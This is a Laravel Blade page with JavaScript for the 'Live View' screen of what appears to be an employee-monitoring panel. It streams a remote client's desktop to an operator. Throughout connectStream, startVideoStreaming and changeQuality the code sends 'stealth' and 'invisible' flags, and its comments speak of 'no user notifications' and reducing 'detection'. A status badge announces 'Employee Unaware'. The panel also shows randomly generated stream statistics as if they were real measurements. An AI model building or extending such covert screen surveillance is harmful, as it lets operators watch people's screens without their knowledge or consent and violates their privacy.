@extends('layouts.app')

@section('title', 'Live View - ' . $client->hostname)

@section('breadcrumb')
<nav aria-label="breadcrumb">
    <ol class="breadcrumb">
        <li class="breadcrumb-item"><a href="{{ route('dashboard') }}">Dashboard</a></li>
        <li class="breadcrumb-item"><a href="{{ route('client.details', $client->client_id) }}">{{ $client->hostname }}</a></li>
        <li class="breadcrumb-item active">Live View</li>
    </ol>
</nav>
@endsection

@section('styles')
<style>
    .stream-container {
        background: #000;
        border-radius: 8px;
        position: relative;
        min-height: 500px;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .stream-video {
        width: 100%;
        height: auto;
        border-radius: 8px;
    }

    .stream-controls {
        position: absolute;
        bottom: 10px;
        left: 50%;
        transform: translateX(-50%);
        background: rgba(0, 0, 0, 0.8);
        padding: 10px 20px;
        border-radius: 25px;
        display: flex;
        gap: 10px;
        align-items: center;
    }

    .stream-status {
        position: absolute;
        top: 10px;
        right: 10px;
        padding: 5px 10px;
        border-radius: 15px;
        font-size: 0.8rem;
        font-weight: bold;
    }

    .connection-indicator {
        width: 8px;
        height: 8px;
        border-radius: 50%;
        display: inline-block;
        margin-right: 5px;
        animation: blink 2s infinite;
    }

    @keyframes blink {
        0%, 50% { opacity: 1; }
        51%, 100% { opacity: 0.3; }
    }

    .quality-selector {
        background: rgba(255, 255, 255, 0.1);
        border: 1px solid rgba(255, 255, 255, 0.3);
        color: white;
        padding: 5px 10px;
        border-radius: 5px;
        font-size: 0.9rem;
    }

    .stats-panel {
        background: rgba(255, 255, 255, 0.95);
        backdrop-filter: blur(10px);
        border-radius: 8px;
        padding: 15px;
        position: sticky;
        top: 20px;
    }
</style>
@endsection

@section('content')
<div class="d-flex justify-content-between align-items-center mb-4">
    <div>
        <h1 class="h3 mb-0">
            <i class="fas fa-video text-primary"></i>
            Live View - {{ $client->hostname }}
        </h1>
        <p class="text-muted mb-0">Real-time screen monitoring</p>
    </div>
    <div>
        <span class="badge {{ $client->isOnline() ? 'bg-success' : 'bg-danger' }}">
            <span class="connection-indicator {{ $client->isOnline() ? 'bg-success' : 'bg-danger' }}"></span>
            {{ $client->isOnline() ? 'Online' : 'Offline' }}
        </span>
    </div>
</div>

<div class="row">
    <div class="col-lg-9">
        <!-- Stream Container -->
        <div class="card">
            <div class="card-body p-0">
                <div class="stream-container" id="streamContainer">
                    <!-- Stream video will be inserted here -->
                    <video id="streamVideo" class="stream-video" style="display: none;" autoplay muted></video>

                    <!-- Loading/Error states -->
                    <div id="streamLoading" class="text-center text-white">
                        <div class="spinner-border text-primary mb-3" role="status">
                            <span class="visually-hidden">Loading...</span>
                        </div>
                        <h5>Connecting to {{ $client->hostname }}...</h5>
                        <p class="text-muted">Please wait while we establish the connection</p>
                    </div>

                    <div id="streamError" class="text-center text-white" style="display: none;">
                        <i class="fas fa-exclamation-triangle fa-3x text-warning mb-3"></i>
                        <h5>Connection Failed</h5>
                        <p class="text-muted">Unable to connect to the client for live streaming</p>
                        <button class="btn btn-primary" onclick="connectStream()">
                            <i class="fas fa-redo"></i> Retry Connection
                        </button>
                    </div>

                    <div id="streamOffline" class="text-center text-white" style="display: none;">
                        <i class="fas fa-power-off fa-3x text-secondary mb-3"></i>
                        <h5>Client Offline</h5>
                        <p class="text-muted">{{ $client->hostname }} is currently offline</p>
                    </div>

                    <!-- Stream Controls -->
                    <div class="stream-controls" id="streamControls" style="display: none;">
                        <button class="btn btn-sm btn-outline-light" id="playPauseBtn" onclick="togglePlayPause()">
                            <i class="fas fa-pause"></i>
                        </button>

                        <select class="quality-selector" id="qualitySelector" onchange="changeQuality()">
                            <option value="low">Low (360p) - Stealth</option>
                            <option value="medium" selected>Medium (480p) - Stealth</option>
                            <option value="high">High (720p) - Stealth</option>
                        </select>

                        <button class="btn btn-sm btn-outline-light" onclick="toggleFullscreen()">
                            <i class="fas fa-expand"></i>
                        </button>

                        <button class="btn btn-sm btn-outline-light" onclick="takeScreenshot()">
                            <i class="fas fa-camera"></i>
                        </button>
                    </div>

                    <!-- Stream Status -->
                    <div class="stream-status bg-success text-white" id="streamStatus" style="display: none;">
                        <span class="connection-indicator bg-success"></span>
                        LIVE
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="col-lg-3">
        <!-- Client Info Panel -->
        <div class="stats-panel mb-4">
            <h6 class="fw-bold mb-3">Client Information</h6>
            <dl class="row mb-0">
                <dt class="col-6">Hostname:</dt>
                <dd class="col-6">{{ $client->hostname }}</dd>

                <dt class="col-6">User:</dt>
                <dd class="col-6">{{ $client->username }}</dd>

                <dt class="col-6">IP:</dt>
                <dd class="col-6">{{ $client->ip_address }}</dd>

                <dt class="col-6">OS:</dt>
                <dd class="col-6">{{ $client->getOsDisplayName() }}</dd>

                <dt class="col-6">Last Seen:</dt>
                <dd class="col-6">{{ $client->last_seen ? $client->last_seen->diffForHumans() : 'Never' }}</dd>
            </dl>
        </div>

        <!-- Stream Stats -->
        <div class="stats-panel mb-4">
            <h6 class="fw-bold mb-3">Stream Statistics</h6>
            <div class="row text-center">
                <div class="col-6">
                    <div class="border-end">
                        <h5 id="streamFps" class="text-primary mb-0">--</h5>
                        <small class="text-muted">FPS</small>
                    </div>
                </div>
                <div class="col-6">
                    <h5 id="streamBitrate" class="text-success mb-0">--</h5>
                    <small class="text-muted">Mbps</small>
                </div>
            </div>
            <hr>
            <div class="row text-center">
                <div class="col-6">
                    <div class="border-end">
                        <h6 id="streamResolution" class="text-info mb-0">--</h6>
                        <small class="text-muted">Resolution</small>
                    </div>
                </div>
                <div class="col-6">
                    <h6 id="streamLatency" class="text-warning mb-0">--</h6>
                    <small class="text-muted">Latency</small>
                </div>
            </div>
        </div>

        <!-- Quick Actions -->
        <div class="stats-panel">
            <h6 class="fw-bold mb-3">Quick Actions</h6>
            <div class="d-grid gap-2">
                <button class="btn btn-outline-primary btn-sm" onclick="requestScreenshot()">
                    <i class="fas fa-camera"></i> Take Screenshot
                </button>
                <button class="btn btn-outline-info btn-sm" onclick="openClientDetails()">
                    <i class="fas fa-info-circle"></i> View Details
                </button>
                <button class="btn btn-outline-secondary btn-sm" onclick="refreshConnection()">
                    <i class="fas fa-sync"></i> Refresh
                </button>
            </div>
        </div>
    </div>
</div>
@endsection

@section('scripts')
<script>
let streamConnection = null;
let isStreaming = false;
let streamStats = {
    fps: 0,
    bitrate: 0,
    resolution: 'Unknown',
    latency: 0
};

document.addEventListener('DOMContentLoaded', function() {
    // Check if client is online before attempting connection
    @if($client->isOnline())
        connectStream();
    @else
        showOfflineState();
    @endif
});

// Stealth video streaming connection - this will be used instead of WebRTC
// We'll modify connectStream to use our stealth video approach

function initializeWebRTC(clientId) {
    const streamVideo = document.getElementById('streamVideo');
    const streamLoading = document.getElementById('streamLoading');
    const streamControls = document.getElementById('streamControls');
    const streamStatus = document.getElementById('streamStatus');

    // Create RTCPeerConnection
    const configuration = {
        iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' }
        ]
    };

    window.peerConnection = new RTCPeerConnection(configuration);

    // Handle incoming stream
    peerConnection.ontrack = function(event) {
        console.log('Received remote stream');
        streamVideo.srcObject = event.streams[0];
        streamLoading.style.display = 'none';
        streamVideo.style.display = 'block';
        streamControls.style.display = 'flex';
        streamStatus.style.display = 'block';

        // Update status
        document.getElementById('streamResolution').textContent = '1920x1080';
        document.getElementById('streamFps').textContent = '30 FPS';
        document.getElementById('streamBitrate').textContent = '2 Mbps';
    };

    // Handle ICE candidates
    peerConnection.onicecandidate = function(event) {
        if (event.candidate) {
            console.log('Sending ICE candidate');
            sendSignalingMessage(clientId, {
                type: 'ice-candidate',
                candidate: event.candidate
            });
        }
    };

    // Handle connection state changes
    peerConnection.onconnectionstatechange = function() {
        console.log('Connection state:', peerConnection.connectionState);

        if (peerConnection.connectionState === 'failed') {
            showError('WebRTC connection failed. Falling back to screenshot streaming...');
            setTimeout(() => startScreenshotStream(clientId), 2000);
        }
    };

    // Start WebRTC negotiation
    startWebRTCNegotiation(clientId);
}

function startWebRTCNegotiation(clientId) {
    // Create offer
    window.peerConnection.createOffer()
        .then(offer => {
            return peerConnection.setLocalDescription(offer);
        })
        .then(() => {
            console.log('Sending offer to client');
            sendSignalingMessage(clientId, {
                type: 'offer',
                sdp: peerConnection.localDescription
            });
        })
        .catch(error => {
            console.error('Error creating offer:', error);
            showError('Failed to initialize video streaming. Falling back to screenshot mode...');
            setTimeout(() => startScreenshotStream(clientId), 2000);
        });
}

function sendSignalingMessage(clientId, message) {
    fetch(`/api/clients/${clientId}/webrtc-signal`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': '{{ csrf_token() }}'
        },
        body: JSON.stringify(message)
    })
    .then(response => response.json())
    .then(data => {
        if (data.success && data.response) {
            handleSignalingResponse(data.response);
        }
    })
    .catch(error => {
        console.error('Signaling error:', error);
        showError('WebRTC signaling failed. Using screenshot streaming as fallback...');
        setTimeout(() => startScreenshotStream(clientId), 1000);
    });
}

function handleSignalingResponse(response) {
    const peerConnection = window.peerConnection;

    if (response.type === 'answer') {
        peerConnection.setRemoteDescription(new RTCSessionDescription(response.sdp))
            .then(() => {
                console.log('Remote description set successfully');
            })
            .catch(error => {
                console.error('Error setting remote description:', error);
            });
    } else if (response.type === 'ice-candidate') {
        peerConnection.addIceCandidate(new RTCIceCandidate(response.candidate))
            .then(() => {
                console.log('ICE candidate added successfully');
            })
            .catch(error => {
                console.error('Error adding ICE candidate:', error);
            });
    }
}

function startScreenshotStream(clientId) {
    console.log('Starting screenshot streaming fallback');
    const streamContainer = document.getElementById('streamContainer');
    const streamLoading = document.getElementById('streamLoading');
    const streamControls = document.getElementById('streamControls');
    const streamStatus = document.getElementById('streamStatus');

    // Remove any existing stream elements
    const existingImg = document.getElementById('liveScreenshot');
    if (existingImg) {
        existingImg.remove();
    }

    // Create image element for screenshots
    const img = document.createElement('img');
    img.id = 'liveScreenshot';
    img.className = 'stream-video';
    img.style.width = '100%';
    img.style.height = 'auto';
    img.style.borderRadius = '8px';

    // Get latest screenshot
    fetch(`/api/clients/${clientId}/latest-screenshot`)
        .then(response => response.json())
        .then(data => {
            if (data.success && data.screenshot) {
                streamLoading.style.display = 'none';

                // Show screenshot
                img.src = data.screenshot.url + '?t=' + Date.now();
                img.onload = function() {
                    streamContainer.appendChild(img);
                    streamControls.style.display = 'flex';
                    streamStatus.style.display = 'block';

                    // Update status for screenshot mode
                    document.getElementById('streamResolution').textContent = data.screenshot.resolution;
                    document.getElementById('streamFps').textContent = '0.3 FPS (Screenshot Mode)';
                    document.getElementById('streamBitrate').textContent = 'Auto';
                };

                // Start auto-refresh for screenshots
                if (window.liveStreamInterval) {
                    clearInterval(window.liveStreamInterval);
                }

                window.liveStreamInterval = setInterval(() => {
                    refreshScreenshot(clientId, img);
                }, 3000); // Update every 3 seconds

            } else {
                showError('No screenshots available. Please ensure client is capturing screenshots.');
            }
        })
        .catch(error => {
            console.error('Error fetching screenshot:', error);
            showError('Unable to connect to client. Please check if the client is online.');
        });
}

function showError(message) {
    document.getElementById('streamLoading').style.display = 'none';
    document.getElementById('streamError').style.display = 'block';
    console.error('Stream error:', message);
}

function refreshScreenshot(clientId, imgElement) {
    // Add null check for imgElement
    if (!imgElement) {
        console.error('Error refreshing screenshot: Image element is null');
        return;
    }

    fetch(`/api/clients/${clientId}/latest-screenshot`)
        .then(response => response.json())
        .then(data => {
            if (data.success && data.screenshot) {
                // Update image with cache buster
                imgElement.src = data.screenshot.url + '?t=' + Date.now();

                // Update resolution if changed
                const resolutionElement = document.getElementById('streamResolution');
                if (resolutionElement) {
                    resolutionElement.textContent = data.screenshot.resolution;
                }
            }
        })
        .catch(error => {
            console.error('Error refreshing screenshot:', error);
        });
}

function showOfflineState() {
    document.getElementById('streamLoading').style.display = 'none';
    document.getElementById('streamOffline').style.display = 'block';
}

function togglePlayPause() {
    const btn = document.getElementById('playPauseBtn');
    const streamImage = document.getElementById('streamImage');
    const video = document.getElementById('streamVideo');
    const img = document.getElementById('liveScreenshot');

    if (streamImage) {
        // Stealth stream mode - toggle stream request
        const clientId = '{{ $client->client_id }}';

        if (window.streamEventSource) {
            // Stop stealth stream
            disconnectStream();
            btn.innerHTML = '<i class="fas fa-play"></i>';
        } else {
            // Start stealth stream
            connectStream();
            btn.innerHTML = '<i class="fas fa-pause"></i>';
        }

    } else if (video && video.style.display !== 'none') {
        // Video mode
        if (video.paused) {
            video.play();
            btn.innerHTML = '<i class="fas fa-pause"></i>';
        } else {
            video.pause();
            btn.innerHTML = '<i class="fas fa-play"></i>';
        }

    } else if (img) {
        // Screenshot mode - toggle auto-refresh
        if (window.liveStreamInterval) {
            clearInterval(window.liveStreamInterval);
            window.liveStreamInterval = null;
            btn.innerHTML = '<i class="fas fa-play"></i>';
        } else {
            const clientId = '{{ $client->client_id }}';
            window.liveStreamInterval = setInterval(() => {
                refreshScreenshot(clientId, img);
            }, 3000);
            btn.innerHTML = '<i class="fas fa-pause"></i>';
        }
    }
}

function disconnectStream() {
    console.log('Disconnecting stealth stream...');

    const clientId = '{{ $client->client_id }}';

    // Get CSRF token safely
    const csrfTokenMeta = document.querySelector('meta[name="csrf-token"]');
    const csrfToken = csrfTokenMeta ? csrfTokenMeta.getAttribute('content') : '';

    // Send stop request to server
    fetch(`/api/stream/stop/${clientId}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': csrfToken
        }
    })
    .then(response => response.json())
    .then(data => {
        console.log('Stream stop request sent');
    })
    .catch(error => {
        console.error('Error stopping stream:', error);
    });

    // Stop video streaming
    if (window.stopVideoStream) {
        window.stopVideoStream();
        window.stopVideoStream = null;
    }

    // Close event source (legacy)
    if (window.streamEventSource) {
        window.streamEventSource.close();
        window.streamEventSource = null;
    }

    // Clear intervals
    if (window.liveStreamInterval) {
        clearInterval(window.liveStreamInterval);
        window.liveStreamInterval = null;
    }

    // Close WebRTC connection (if any)
    if (window.peerConnection) {
        window.peerConnection.close();
        window.peerConnection = null;
    }

    // Reset UI
    const streamVideo = document.getElementById('streamVideo');
    const streamImage = document.getElementById('streamImage');
    const img = document.getElementById('liveScreenshot');
    const streamControls = document.getElementById('streamControls');
    const streamStatus = document.getElementById('streamStatus');

    if (streamVideo) streamVideo.style.display = 'none';
    if (streamImage) streamImage.remove();
    if (img) img.remove();
    if (streamControls) streamControls.style.display = 'none';
    if (streamStatus) streamStatus.style.display = 'none';

    document.getElementById('streamLoading').style.display = 'block';
}// Error handling and fallback
function handleStreamError(error) {
    console.error('Stream error:', error);

    const errorMessage = document.getElementById('errorMessage');
    if (errorMessage) {
        errorMessage.style.display = 'block';
        errorMessage.textContent = `Stream error: ${error.message || 'Connection failed'}`;
    }

    // Try fallback to screenshot mode
    console.log('Falling back to screenshot mode...');
    fallbackToScreenshots();
}

function fallbackToScreenshots() {
    const clientId = '{{ $client->client_id }}';
    const streamVideo = document.getElementById('streamVideo');
    const streamLoading = document.getElementById('streamLoading');
    const streamStatus = document.getElementById('streamStatus');

    // Hide video elements
    if (streamVideo) streamVideo.style.display = 'none';
    if (streamLoading) streamLoading.style.display = 'block';

    // Create fallback screenshot
    if (!document.getElementById('liveScreenshot')) {
        const img = document.createElement('img');
        img.id = 'liveScreenshot';
        img.className = 'img-fluid rounded shadow-sm';
        img.style.maxHeight = '600px';
        img.style.width = '100%';

        const container = document.querySelector('.live-stream-container');
        if (container) {
            container.appendChild(img);
        }
    }

    // Start screenshot refresh
    const img = document.getElementById('liveScreenshot');

    if (img) {
        refreshScreenshot(clientId, img);

        // Auto-refresh every 3 seconds
        if (!window.liveStreamInterval) {
            window.liveStreamInterval = setInterval(() => {
                refreshScreenshot(clientId, img);
            }, 3000);
        }
    } else {
        console.warn('liveScreenshot element not found, screenshot refresh disabled');
    }

    if (streamStatus) {
        streamStatus.style.display = 'block';
        streamStatus.innerHTML = '<span class="badge bg-warning">Screenshot Mode</span>';
    }
}

// WebRTC compatibility check
function isWebRTCSupported() {
    return !!(navigator.mediaDevices &&
              navigator.mediaDevices.getDisplayMedia &&
              window.RTCPeerConnection);
}

// Cleanup on page unload
window.addEventListener('beforeunload', function() {
    disconnectStream();
});

function connectStream() {
    console.log('Starting stealth video stream request...');

    const clientId = '{{ $client->client_id }}';
    const streamLoading = document.getElementById('streamLoading');
    const streamStatus = document.getElementById('streamStatus');
    const streamControls = document.getElementById('streamControls');
    const streamContainer = document.getElementById('streamContainer');

    // Get CSRF token safely
    const csrfTokenMeta = document.querySelector('meta[name="csrf-token"]');
    const csrfToken = csrfTokenMeta ? csrfTokenMeta.getAttribute('content') : '';

    // Hide video element and show loading
    const streamVideo = document.getElementById('streamVideo');
    streamVideo.style.display = 'none';
    streamLoading.style.display = 'block';

    // Send stream request to server (stealth - no user notification)
    fetch(`/api/stream/start/${clientId}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': csrfToken
        },
        body: JSON.stringify({
            quality: 'medium', // Default to 480p for optimal stealth performance
            fps: 8, // Lower FPS to reduce detection and improve performance
            stealth: true, // Critical: No user notifications or popups
            invisible: true, // Ensure completely invisible operation
            resolution: '854x480' // Explicit resolution for stealth mode
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log('Video stream request sent successfully');

            // Update UI
            streamLoading.style.display = 'none';
            streamControls.style.display = 'block';
            streamStatus.style.display = 'block';
            streamStatus.innerHTML = '<span class="badge bg-success">🔒 Invisible Video Stream Active - Employee Unaware</span>';

            // Start video-like streaming (faster frame updates)
            startVideoStreaming(clientId);

        } else {
            console.error('Failed to start video stream:', data);
            handleStreamError(new Error('Failed to start video stream'));
        }
    })
    .catch(error => {
        console.error('Video stream request error:', error);
        handleStreamError(error);
    });
}

function startVideoStreaming(clientId) {
    console.log('Starting high-speed video stream polling...');

    // Create or get stream image element
    let streamImg = document.getElementById('streamImage');
    const streamContainer = document.getElementById('streamContainer');

    if (!streamImg) {
        streamImg = document.createElement('img');
        streamImg.id = 'streamImage';
        streamImg.className = 'stream-video';
        streamImg.style.width = '100%';
        streamImg.style.height = 'auto';
        streamImg.style.borderRadius = '8px';
        streamImg.style.maxHeight = '600px';
        streamContainer.appendChild(streamImg);
    }

    // Show the stream image
    streamImg.style.display = 'block';

    let isStreaming = true;
    let frameCount = 0;
    const startTime = Date.now();

    // Higher frequency polling for stealth video experience (8 FPS - optimal for stealth)
    async function fetchVideoFrame() {
        if (!isStreaming) return;

        try {
            const response = await fetch(`/api/stream/latest/${clientId}?t=${Date.now()}&stealth=true`);
            const data = await response.json();

            if (data.data) {
                // Update frame silently
                streamImg.src = `data:image/jpeg;base64,${data.data}`;
                frameCount++;

                // Update FPS display
                const elapsed = (Date.now() - startTime) / 1000;
                const fps = (frameCount / elapsed).toFixed(1);

                const fpsElement = document.getElementById('streamFps');
                if (fpsElement) {
                    fpsElement.textContent = `${fps} FPS (Stealth Video - No User Notification)`;
                }

                // Update resolution if available
                const resElement = document.getElementById('streamResolution');
                if (resElement && data.resolution) {
                    resElement.textContent = data.resolution + ' (Stealth Mode)';
                }
            }

        } catch (error) {
            console.warn('Stealth frame fetch (continuing silently):', error);
        }

        // Continue stealth streaming with optimized refresh rate
        if (isStreaming) {
            setTimeout(fetchVideoFrame, 125); // 8 FPS (125ms interval) - optimal for stealth
        }
    }

    // Start the video stream
    fetchVideoFrame();

    // Store streaming state
    window.videoStreamActive = true;
    window.stopVideoStream = () => {
        isStreaming = false;
        window.videoStreamActive = false;
    };

    // Initial stealth frame fetch for immediate display
    fetch(`/api/stream/latest/${clientId}?initial=true&stealth=true`)
        .then(response => response.json())
        .then(data => {
            if (data.data) {
                streamImg.src = `data:image/jpeg;base64,${data.data}`;

                // Update stream stats
                const qualityElement = document.getElementById('streamBitrate');
                if (qualityElement) {
                    qualityElement.textContent = 'Auto (Stealth Video Mode - No Detection)';
                }
            }
        })
        .catch(error => console.warn('Initial stealth frame (continuing silently):', error));
}

function changeQuality(quality) {
    console.log(`Changing to stealth quality: ${quality}`);

    const clientId = '{{ $client->client_id }}';
    const resolutionMap = {
        'low': '640x360',      // 360p - Stealth
        'medium': '854x480',   // 480p - Stealth
        'high': '1280x720'     // 720p - Stealth
    };

    // Send quality change request with stealth parameters
    fetch(`/api/stream/start/${clientId}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
        },
        body: JSON.stringify({
            quality: quality,
            resolution: resolutionMap[quality],
            fps: 8, // Stealth FPS
            stealth: true,
            invisible: true
        })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log(`Quality changed to ${quality} (${resolutionMap[quality]}) - Stealth mode`);

            // Update quality display
            const qualityElement = document.getElementById('streamBitrate');
            if (qualityElement) {
                qualityElement.textContent = `${quality.charAt(0).toUpperCase() + quality.slice(1)} (${resolutionMap[quality]}) - Stealth`;
            }
        }
    })
    .catch(error => console.error('Quality change error:', error));
}

// Video stream event handling
function setupStreamEvents(clientId) {
    const eventSource = new EventSource(`/api/stream/events/${clientId}`);
    const streamStatus = document.getElementById('streamStatus');

    eventSource.onopen = function() {
        console.log('Stream events connected');
        if (streamStatus) {
            streamStatus.innerHTML = '<span class="badge bg-success">Connected</span>';
        }
    };

    eventSource.onmessage = function(event) {
        try {
            const data = JSON.parse(event.data);

            if (data.type === 'stream_data') {
                // Display stream frame as image
                displayStreamFrame(data.data);

            } else if (data.type === 'stream_ended') {
                console.log('Stream ended');
                eventSource.close();
                disconnectStream();
            }

        } catch (error) {
            console.error('Error processing stream data:', error);
        }
    };

    eventSource.onerror = function(error) {
        console.error('Stream events error:', error);
        eventSource.close();
        handleStreamError(error);
    };

    // Store reference for cleanup
    window.streamEventSource = eventSource;
}

function displayStreamFrame(imageData) {
    // Create or update stream image element
    let streamImg = document.getElementById('streamImage');

    if (!streamImg) {
        streamImg = document.createElement('img');
        streamImg.id = 'streamImage';
        streamImg.className = 'img-fluid rounded shadow-sm';
        streamImg.style.maxHeight = '600px';
        streamImg.style.width = '100%';

        const container = document.querySelector('.live-stream-container');
        if (container) {
            container.appendChild(streamImg);
        }
    }

    // Update image source with base64 data
    streamImg.src = `data:image/jpeg;base64,${imageData}`;
}

function setupPeerConnection(stream) {
    console.log('Setting up peer connection...');

    // Create RTCPeerConnection
    const configuration = {
        iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            { urls: 'stun:stun1.l.google.com:19302' }
        ]
    };

    window.peerConnection = new RTCPeerConnection(configuration);

    // Add stream to peer connection
    stream.getTracks().forEach(track => {
        window.peerConnection.addTrack(track, stream);
    });

    // Handle connection state changes
    window.peerConnection.onconnectionstatechange = function() {
        console.log('Connection state:', window.peerConnection.connectionState);

        const streamStatus = document.getElementById('streamStatus');
        if (streamStatus) {
            switch (window.peerConnection.connectionState) {
                case 'connected':
                    streamStatus.innerHTML = '<span class="badge bg-success">Connected</span>';
                    break;
                case 'connecting':
                    streamStatus.innerHTML = '<span class="badge bg-warning">Connecting...</span>';
                    break;
                case 'disconnected':
                case 'failed':
                    streamStatus.innerHTML = '<span class="badge bg-danger">Disconnected</span>';
                    break;
            }
        }
    };

    console.log('Peer connection setup complete');
}

function toggleFullscreen() {
    const container = document.getElementById('streamContainer');

    if (!document.fullscreenElement) {
        container.requestFullscreen().catch(err => {
            console.error('Error attempting to enable fullscreen:', err);
        });
    } else {
        document.exitFullscreen();
    }
}

function takeScreenshot() {
    // In real implementation, this would capture current frame
    alert('Screenshot captured! (Demo)');
}

function requestScreenshot() {
    // Send request to client to take a screenshot
    fetch('/api/clients/{{ $client->client_id }}/screenshot', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': '{{ csrf_token() }}'
        }
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            alert('Screenshot requested successfully!');
        } else {
            alert('Failed to request screenshot: ' + data.message);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('Error requesting screenshot');
    });
}

function openClientDetails() {
    window.open('{{ route("client.details", $client->client_id) }}', '_blank');
}

function refreshConnection() {
    connectStream();
}

// Update stream stats periodically
setInterval(() => {
    if (isStreaming) {
        // In real implementation, these would be actual WebRTC stats
        streamStats.fps = Math.floor(Math.random() * 10) + 20;
        streamStats.bitrate = (Math.random() * 2 + 1).toFixed(1);
        streamStats.latency = Math.floor(Math.random() * 50) + 50;

        document.getElementById('streamFps').textContent = streamStats.fps;
        document.getElementById('streamBitrate').textContent = streamStats.bitrate;
        document.getElementById('streamLatency').textContent = streamStats.latency + 'ms';
    }
}, 1000);

// Handle fullscreen changes
document.addEventListener('fullscreenchange', function() {
    const container = document.getElementById('streamContainer');
    if (document.fullscreenElement) {
        container.classList.add('fullscreen');
    } else {
        container.classList.remove('fullscreen');
    }
});

// Auto-refresh client status
setInterval(() => {
    // Check client online status
    fetch('/api/clients/{{ $client->client_id }}')
        .then(response => response.json())
        .then(data => {
            if (data.success && data.client) {
                const isOnline = data.client.status === 'active';
                if (!isOnline && isStreaming) {
                    // Client went offline
                    isStreaming = false;
                    showOfflineState();
                }
            }
        })
        .catch(error => console.error('Error checking client status:', error));
}, 10000);
</script>
@endsection
